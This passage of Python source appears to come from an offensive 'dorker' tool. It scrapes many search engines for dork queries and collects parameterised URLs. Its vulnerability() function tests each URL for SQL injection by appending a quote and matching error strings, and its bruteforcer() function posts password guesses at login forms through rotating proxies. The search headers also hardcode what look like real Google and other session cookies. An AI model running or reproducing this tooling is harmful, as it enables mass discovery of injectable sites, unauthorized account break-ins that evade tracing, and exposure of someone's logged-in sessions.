                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'googlescholar':
        try:
            url = "https://scholar.google.com/scholar?hl=en&as_sdt=0%2C5&q={}&btnG=".format(dork)
            headers = {
                "Host":"scholar.google.com",
                "Connection":"keep-alive",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "X-Client-Data":"CIy2yQEIo7bJAQjAtskBCKmdygEIrMfKAQj2x8oBCPjHygEI58rKAQi0y8oBCKPNygEIoc/KAQjc1coBCIWZywEIk5rLAQjBnMsBCNScywEY7bjKAQ==",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://scholar.google.com/",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Cookie":"CONSENT=YES+RO.ro+V10+BX; SID=4gekbTB7LNT4kIT8rS950V9TMAZErY7mzHfurA1ZibMAXQuGD1uHU2IOSzoIKH1BYT2jfg.; __Secure-3PSID=4gekbTB7LNT4kIT8rS950V9TMAZErY7mzHfurA1ZibMAXQuGFH8R3UYl5DBDL3lpqaMDUQ.; HSID=Aa6eRmgXRwCtNyo1E; SSID=Af-8XBO5nLdm9COeG; APISID=VqemXB8TA939r_OA/AReC-g1HnkzF5seGn; SAPISID=5DlJZxnwryLE80HW/Ak0VcjKd2skiC_hwO; __Secure-3PAPISID=5DlJZxnwryLE80HW/Ak0VcjKd2skiC_hwO; ANID=AHWqTUmVG-jS1BfhgzoaggOhKe8Po63C2XYtG1xf5OvG3YA6SqnjEbKTAJz1zqpk; NID=205=MgzalCc0fEZhH_Yw1QJIHk9s4r7TYv1xPRqjQ1BtrPej76dbclDsqab55INnZFEG1A435eb3M8-nYQMx5bLvxscUboCWWdsQ_oqkkH8jzYKs3hS1aqS47sdDcx1cpFdQHeSri1crHHqPdZsSJgn9g8hNLLIA0PVb4zjugcf81kZkWIgS-FJta54ZSXNam5pLl563fmxX59PTJU9w1IPUnI2UnhapnP1ZRXJaKmPJb_q9crLvepcwJCr0dRBSFh_4wstGOIFOrpzpMBXri4LUzt-j52zpsWNYPzdX07sKDRwqpMQvWnVXEK65; 1P_JAR=2020-12-19-21; SEARCH_SAMESITE=CgQIt5EB; GSP=LM=1608412697:S=btv2Z2nfF-lh0meK; SIDCC=AJi4QfEqc3IA98UBxW6fv_am2MlZEPhg3g4TNgqGEbSDjybtCc0Vh_ZI1CdvwzNKxEIo9bfkAMBy; __Secure-3PSIDCC=AJi4QfH6Q_hEpKnhIQGJYqrPUtVTKZKINhQpULCLD3v973bbRt_2_gXm6qdOz8l1AquhRP-qSd7K",
                "Accept-Encoding":"gzip, deflate"
            }
            r = requests.get(url, headers=headers)
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('tabindex="-1"><a href="(.*?)" data-clk="', str(r.text))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == "ecosia":
        try:
            url = "https://www.ecosia.org/search?q={}".format(dork)
            headers = {
                "Host":"www.ecosia.org",
                "Connection":"keep-alive",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://www.ecosia.org/",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Cookie":"ECFG=a=0:as=1:cs=0:dt=pc:f=i:fr=0:fs=1:l=en:lt=0:mc=en-us:nf=1:nt=0:ps=1:t=0:tt=na:tu=auto:wu=auto:ma=0; ecosia_sp2id.3d5d=ecf8817f-a4ed-47e9-a00a-bfa1dd54a430.1608413625.1.1608413625.1608413625.64d00831-4d72-4e0b-948b-575b33dd18b1; ecosia_sp2ses.3d5d=*; sp=be2c9ef7-af40-48dd-b991-ebfab128637d",
                "Accept-Encoding":"gzip, deflate"
            }
            r = requests.get(url, headers=headers)
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('data-display-url="(.*?)"', str(r.text))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == "ecowho":
        try:
            url = "https://www.ecowho.com/search/?q={}&x=15&y=13".format(dork)
            headers = { 
                "Host":"www.ecowho.com",
                "Connection":"keep-alive",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://www.ecowho.com/search/",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Cookie":"b=Uk8vLzlmMmI3; PHPSESSID=0k7ns8ubac0jlbccptenh58bk1; AWSUSER_ID=awsuser_id1608449494330r8008; AWSSESSION_ID=awssession_id1608449494330r8008; b=Uk8vLzlmMmI3",
                "Accept-Encoding":"gzip, deflate"
            }
            r = requests.get(url, headers=headers)
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('<a title="View site" href="(.*?)" onclick=', str(r.text))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == "searx":
        try:
            headers = {
                "Host":"searx.info",
                "Connection":"keep-alive",
                "Cache-Control":"max-age=0",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "Upgrade-Insecure-Requests":"1",
                "Origin":"null",
                "Content-Type":"application/x-www-form-urlencoded",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Cookie":"searxspms=searx",
                "Accept-Encoding":"gzip, deflate",
                "Content-Length":"53"
            }

            content = "q=test&category_general=on&time_range=&language=en-US"

            r = requests.post('https://searx.info/', headers=headers, data=content)
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('<a href="(.*?)" rel="noreferrer" aria-labelledby="', str(r.text))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'w3catalog':
        try:
            url = "https://www.w3catalog.com/index.php?search={}".format(dork)
            headers = {
                "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-encoding":"gzip, deflate, br",
                "accept-language":"en-US,en;q=0.9,ro;q=0.8",
                "cache-control":"max-age=0",
                "cookie":"PHPSESSID=cf8aff6d087148c142644a6ffc76dffc",
                "referer":"https://www.w3catalog.com/",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "sec-fetch-dest":"document",
                "sec-fetch-mode":"navigate",
                "sec-fetch-site":"same-origin",
                "sec-fetch-user":"?1",
                "upgrade-insecure-requests":"1",
                "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
            }
            r = requests.get(url, headers=headers)
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('" href="(.*?)" title="', str(r.text))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'yooz':
        try:
            url = "https://yooz.ir/search?q={}&t=web&btnK=%D8%AC%D8%B3%D8%AA%D8%AC%D9%88%DB%8C+%DB%8C%D9%88%D8%B2".format(dork)
            headers = {
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-Encoding":"gzip, deflate, br",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Connection":"keep-alive",
                "Host":"yooz.ir",
                "Referer":"https://yooz.ir/",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "Sec-Fetch-Dest":"document",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-Site":"same-origin",
                "Sec-Fetch-User":"?1",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
            }
            r = requests.get(url, headers=headers)
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('<a target="_blank" href="(.*?)">', str(r.text))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'mailru':
        try:
            url = "https://go.mail.ru/search?q={}&fm=1&mg=1".format(dork)
            headers = {
                "Host":"go.mail.ru",
                "Connection":"keep-alive",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-site",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://mail.ru/",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Cookie":"act=2b07327cd32649b180251d29f6c014e9; mrcu=8B315FE05F3C058405CB83FE628D; p=ZWoDAOK79QAA; tmr_lvid=f40ad9ee0d2f57a93a57edc7138f4d85; tmr_lvidTS=1608539965289; c=P1/gXwIAACcEAAAUAAAACQAwqR4C; b=uEgEAJAYNgUAmxUghKdQDUMAAAAhRFH3cO6Yhw8nKOCbAAAA; i=AQA+X+BfAgATAAj9VDwAAT8AAVoAAV0AAXQAAh4BAR8BASMBAlsBAY8BApoBATECATICATQCAZsCAeoCAW4DAYsDAScEASgEASoEATEEAToEAVQEAWYEAW8EAZcEAZYFAVkGAfgGATcHAjsHATwHAT0HAp0HAVMIAVsIAcUIAdQIAeAIAeIIAeQIAfwIATwJAdMJAfEJAUQLAZQMAZcMARgNARkNAVgNAY8PAZsPAaUPAf0QAUgRAWMRAboRAfgTAfEWAfQWAfwWAVkZAVoZAV0ZAW4ZAYAZAYcZAY4ZAQcaAZ8aAQYcARccASQcAWAcAXUcAXYcAXccAXgcAYscAaYcAX0eAU4gAYkNBQIBAA==; s=ww=1920|wh=969|fver=0; VID=1Zmhtb30TNn_00000Q0qD4H_:::0-0-0-0:CAASENf5lfgB1UWpQcoViK20Sw4aUBLZlXfDt3KAWmJlmoij5KWLqTHUMZpFVIALrn1-lxKWzad3KzdoVnX59XM89GOTM8XSwq_W7szHXj2vnz2-W_9yYaf4pC7wlTz_kS64m8XI; tmr_reqNum=8",
                "Accept-Encoding":"gzip, deflate"
            }
            r = requests.get(url, headers=headers)
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('"page_url":"(.*?)","urlhash', str(r.text))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'rambler':
        try:
            url = "https://nova.rambler.ru/search?query={}".format(dork)
            headers = {
                "Host":"nova.rambler.ru",
                "Connection":"keep-alive",
                "sec-ch-ua":"\"Google Chrome\";v=\"87\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"87\"",
                "sec-ch-ua-mobile":"?0",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Sec-Fetch-Site":"same-site",
                "Sec-Fetch-Mode":"navigate",
                "Sec-Fetch-User":"?1",
                "Sec-Fetch-Dest":"document",
                "Referer":"https://www.rambler.ru/",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Cookie":"spa_primeHideButton=1%3A0%2B0%3A100; spv_primeHideButton=0; split-v2=3; ruid=vAsAAMVf4F9+crUfAfKMewB=; c8980c62834072c480df58741f1fd039393df9aaea5446dbb1dd2187750209fe_2=vAsAAMVf4F9%2BcrUfAfKMewB%3D; r_id_split=3; dvr=gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:1608540104; top100_id=t1.29811.1334074430.1608540105501; last_visit=1608532905513::1608540105513; detect_count=0; rambler_3rdparty_v2=; uuts=4vrJyHsCxaEKWKW82WjTG5jpE9KnkXpI; proto_uid=1CIAAM9f4F+dXVMFAYSqAwB=; sts=0.1608540107.1.1608540112.2.1608540107.3.1608540107.4.1608540107; lvr=1608540128",
                "Accept-Encoding":"gzip, deflate"
            }
            r = requests.get(url, headers=headers)
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('"page_url":"(.*?)","urlhash', str(r.text))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    elif module == 'parsijoo':
        try:
            url = "http://parsijoo.ir/web?q={}&period=all&filetype=any&site=".format(dork)
            headers = {
                "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "Accept-Encoding":"gzip, deflate",
                "Accept-Language":"en-US,en;q=0.9,ro;q=0.8",
                "Connection":"keep-alive",
                "Cookie":"JSESSIONID=E6A3411E1F335C737917D9579375BC81; pj-ac=rBQ8o1_gYtg18HNhA93gAg",
                "Host":"parsijoo.ir",
                "Referer":"http://parsijoo.ir/",
                "Upgrade-Insecure-Requests":"1",
                "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
            }
            r = requests.get(url, headers=headers)
            if 'Show a different code' in r.text or r.status_code != 200:
                values["retries"]+=1;threading.Thread(target=check, args=(dork, module,)).start()
            else:
                links_all = re.findall('"<a href="(.*?)" onmousedown=', str(r.text))
                if len(links_all) == 0:
                    values['bad']+=1; open('results/{}/blank.txt'.format(str(now)), 'a+', encoding='utf-8').write(dorks+ '\n')
                else:
                    values['checked']+=1
                    for each in links_all:
                        if each.startswith('/'):
                            pass
                        if '=' in each and '?' in each:
                            values['filtered']+=1
                            open('results/{}/filtered.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
                        open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each+ '\n')
                        links.append(each); values['links']+=1; values['cpm1']+=1
        except:
            values['errors']+=1
            threading.Thread(target=check, args=(dork, module,)).start()
    else:
        sys.exit()

def bruteforcer(url, payload, password, good_respone, bad_response):
    global proxies
    sess = requests.Session()
    if type(proxies) is not list or len(proxies) == 0:
        proxies = None
    else:
        proxy = random.choice(proxies)
        if len(proxy.split(':')) == 2:
            proxies = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
        else:
            splits = proxy.split(':')
            proxies = {'http': 'socks5://{}:{}@{}:{}'.format(splits[2], splits[3], splits[0], splits[1]), 'https': 'socks5://{}:{}@{}:{}'.format(splits[2], splits[3], splits[0], splits[1])}
    try:
        payload = payload.replace('<PASS>', password)
        r = sess.post(url, payload)
        if good_respone in r.text:
            values['checked']+=1; values['links']+=1; values['cpm1']+=1
            open('results/{}/good.txt'.format(str(now)), 'a+', encoding='utf-8').write(url + '\n')      
        elif bad_response in r.text:
            values['checked']+=1; values['bad']+=1; values['cpm1']+=1
            open('results/{}/bad.txt'.format(str(now)), 'a+', encoding='utf-8').write(url + '\n')      
        else:
            values['retries']+=1
            threading.Thread(target=bruteforcer, args=(url, payload, password, good_respone, bad_response,)).start()
    except:
        values['errors']+=1
        threading.Thread(target=bruteforcer, args=(url, payload, password, good_respone, bad_response,)).start()
def vulnerability(url):
    global proxies
    sess = requests.Session()
    if type(proxies) is not list or len(proxies) == 0:
        proxies = None
    else:
        proxy = random.choice(proxies)
        if len(proxy.split(':')) == 2:
            proxies = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
        else:
            splits = proxy.split(':')
            proxies = {'http': 'socks5://{}:{}@{}:{}'.format(splits[2], splits[3], splits[0], splits[1]), 'https': 'socks5://{}:{}@{}:{}'.format(splits[2], splits[3], splits[0], splits[1])}
    sess.proxies = proxies
    if not 'http' in url:
        url = 'http://' + url
    try:
        r = sess.get(url + "'")
        finished = False
        for each in config['errors']:
            if each in r.text:
                values['checked']+=1; values['links']+=1; values['cpm1']+=1
                open('results/{}/vulnerable.txt'.format(str(now)), 'a+', encoding='utf-8').write(url + '\n')
                finished = True
                break
        if not finished:
            values['bad']+=1; values['checked']+=1; values['cpm1']+=1
            open('results/{}/not-vulnerable.txt'.format(str(now)), 'a+', encoding='utf-8').write(url + '\n')
    except:
        values['errors']+=1
        threading.Thread(target=vulnerability, args=(url,)).start()
def screen():
    values['cpm2'] = values['cpm1']
    values['cpm1'] = 0
    CallClear()
    if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
    else: print(title)
    print(' Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
    print(f" [{Fore.MAGENTA}-{Fore.WHITE}] Dorks Loaded: [{Fore.MAGENTA}{str(len(dorks))}{Fore.WHITE}]\n [{Fore.MAGENTA}-{Fore.WHITE}] Threads: [{Fore.MAGENTA}{str(threading.active_count())}{Fore.WHITE}]\n [{Fore.MAGENTA}+{Fore.WHITE}] CPM: [{Fore.MAGENTA}{str(values['cpm2']*60)}{Fore.WHITE}]\n\n [{Fore.MAGENTA}+{Fore.WHITE}] Checked: [{Fore.BLUE}{str(values['checked'])}{Fore.WHITE}/{Fore.BLUE}{str(len(dorks))}{Fore.WHITE}]\n [{Fore.MAGENTA}+{Fore.WHITE}] Links: [{Fore.GREEN}{str(values['links'])}{Fore.WHITE}]\n [{Fore.MAGENTA}!{Fore.WHITE}] Filtered: [{Fore.YELLOW}{str(values['filtered'])}{Fore.WHITE}]\n [{Fore.MAGENTA}-{Fore.WHITE}] Blank: [{Fore.RED}{str(values['bad'])}{Fore.WHITE}]\n\n [{Fore.MAGENTA}?{Fore.WHITE}] Retries: [{Fore.MAGENTA}{str(values['retries'])}{Fore.WHITE}]\n [{Fore.MAGENTA}?{Fore.WHITE}] Errors: [{Fore.MAGENTA}{str(values['errors'])}{Fore.WHITE}]")
    time.sleep(1)
    threading.Thread(target=screen).start()

def vuln_screen():
    values['cpm2'] = values['cpm1']
    values['cpm1'] = 0
    CallClear()
    if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
    else: print(title)
    print(' Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
    print(f" [{Fore.MAGENTA}-{Fore.WHITE}] URLS Loaded: [{Fore.MAGENTA}{str(len(dorks))}{Fore.WHITE}]\n [{Fore.MAGENTA}-{Fore.WHITE}] Threads: [{Fore.MAGENTA}{str(threading.active_count())}{Fore.WHITE}]\n [{Fore.MAGENTA}+{Fore.WHITE}] CPM: [{Fore.MAGENTA}{str(values['cpm2']*60)}{Fore.WHITE}]\n\n [{Fore.MAGENTA}+{Fore.WHITE}] Checked: [{Fore.BLUE}{str(values['checked'])}{Fore.WHITE}/{Fore.BLUE}{str(len(dorks))}{Fore.WHITE}]\n [{Fore.MAGENTA}+{Fore.WHITE}] Vulnerables: [{Fore.GREEN}{str(values['links'])}{Fore.WHITE}]\n [{Fore.MAGENTA}-{Fore.WHITE}] Not Vulnerables: [{Fore.RED}{str(values['bad'])}{Fore.WHITE}]\n\n [{Fore.MAGENTA}?{Fore.WHITE}] Retries: [{Fore.MAGENTA}{str(values['retries'])}{Fore.WHITE}]\n [{Fore.MAGENTA}?{Fore.WHITE}] Errors: [{Fore.MAGENTA}{str(values['errors'])}{Fore.WHITE}]")
    time.sleep(1)
    threading.Thread(target=vuln_screen).start()

def bruteforcer_screen(pages):
    values['cpm2'] = values['cpm1']
    values['cpm1'] = 0
    CallClear()
    if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
    else: print(title)
    print(' Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
    print(f" [{Fore.MAGENTA}-{Fore.WHITE}] Passwords Loaded: [{Fore.MAGENTA}{str(len(pages))}{Fore.WHITE}]\n [{Fore.MAGENTA}-{Fore.WHITE}] Threads: [{Fore.MAGENTA}{str(threading.active_count())}{Fore.WHITE}]\n [{Fore.MAGENTA}+{Fore.WHITE}] CPM: [{Fore.MAGENTA}{str(values['cpm2']*60)}{Fore.WHITE}]\n\n [{Fore.MAGENTA}+{Fore.WHITE}] Checked: [{Fore.BLUE}{str(values['checked'])}{Fore.WHITE}/{Fore.BLUE}{str(len(pages))}{Fore.WHITE}]\n [{Fore.MAGENTA}+{Fore.WHITE}] Valid: [{Fore.GREEN}{str(values['links'])}{Fore.WHITE}]\n [{Fore.MAGENTA}-{Fore.WHITE}] Invalid: [{Fore.RED}{str(values['bad'])}{Fore.WHITE}]\n\n [{Fore.MAGENTA}?{Fore.WHITE}] Retries: [{Fore.MAGENTA}{str(values['retries'])}{Fore.WHITE}]\n [{Fore.MAGENTA}?{Fore.WHITE}] Errors: [{Fore.MAGENTA}{str(values['errors'])}{Fore.WHITE}]")
    time.sleep(1)
    threading.Thread(target=bruteforcer_screen, args=(pages,)).start()

def admin_screen(pages):
    values['cpm2'] = values['cpm1']
    values['cpm1'] = 0
    CallClear()
    if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
    else: print(title)
    print(' Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
